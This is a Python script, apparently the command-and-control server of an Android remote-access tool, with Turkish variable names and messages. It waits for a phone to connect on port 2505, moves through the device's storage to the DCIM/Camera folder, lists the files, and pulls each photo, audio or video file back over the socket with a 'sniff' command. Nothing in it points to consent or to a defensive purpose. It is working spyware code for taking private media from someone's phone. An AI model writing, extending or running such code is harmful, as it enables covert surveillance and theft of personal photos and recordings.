import socket
import time
from colorama import Back,Fore,Style,init
fotolar=[]
init()

baglantı=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
baglantı.bind(("0.0.0.0",2505))
print("""
-----------------------------------------------
=================================================
-------------------------------------------------
   """)
print("android cihazi bekleniyor")
baglantı.listen(1)

client,addr=baglantı.accept()
time.sleep(1)

client.send("back".encode("utf-8"))   
print(client.recv(65536).decode("utf-8"))
time.sleep(2)

client.send("cd storage".encode("utf-8")) 
print(client.recv(65536).decode("utf-8"))
time.sleep(2)

client.send("cd dcim".encode("utf-8"))
print(client.recv(65536).decode("utf-8"))
time.sleep(2)

client.send("cd Camera".encode("utf-8"))
print(client.recv(65536).decode("utf-8"))
time.sleep(2)

client.send("ls".encode("utf-8"))
try:
    client.settimeout(2.0)

    while True:
        try:
            ls_verisi=client.recv(65536)
            if not ls_verisi:
                  break
            print(ls_verisi.decode("utf-8"))
            fotolar.extend(ls_verisi.decode("utf-8").strip().split("\n"))
        except socket.timeout:
             break 
except Exception as e:
     print(e)
finally:
     client.settimeout(None)
time.sleep(2)
print("""
      -----
      ----
      ----
      -----
      ----
      ----
      ----
      ----
      ---
      """)
for foto in fotolar:
     
     if not(foto.endswith("jpg") or foto.endswith("png") or foto.endswith("heic") or foto.endswith("mp3") or foto.endswith("mp4")):
         print("hatalı")
     client.send(f"sniff {foto}".encode("utf-8"))
     try:
         print(client.recv(65536).decode("utf-8"))
     except Exception as e:
          print(e)
          client.settimeout(1.5)
          with open(foto,"wb")as f:
            while True:
               try:
                  data=""
                  data=client.recv(65536)                                            
                  if not data:
                        break
                  if data==b"dosyabittiemmi":
                        break   
                  f.write(data)
                  print("data yazılıyor")
               except socket.timeout:
                    data="BİTTİ"
                    break
          print(f"DOSYA ÇEKİLDİ {foto}")

     client.settimeout(1.5)
     with open(foto,"wb")as f:
            while True:
               try:
                  data=""
                  data=client.recv(65536)                                            
                  if not data:
                        break
                  if data==b"dosyabittiemmi":
                        break   
                  f.write(data)
                  print("data yazılıyor")
               except socket.timeout:
                    data="BİTTİ"
                    break
     print(f"DOSYA ÇEKİLDİ {foto}")
     
     time.sleep(3)
     
                    
                  
time.sleep(5)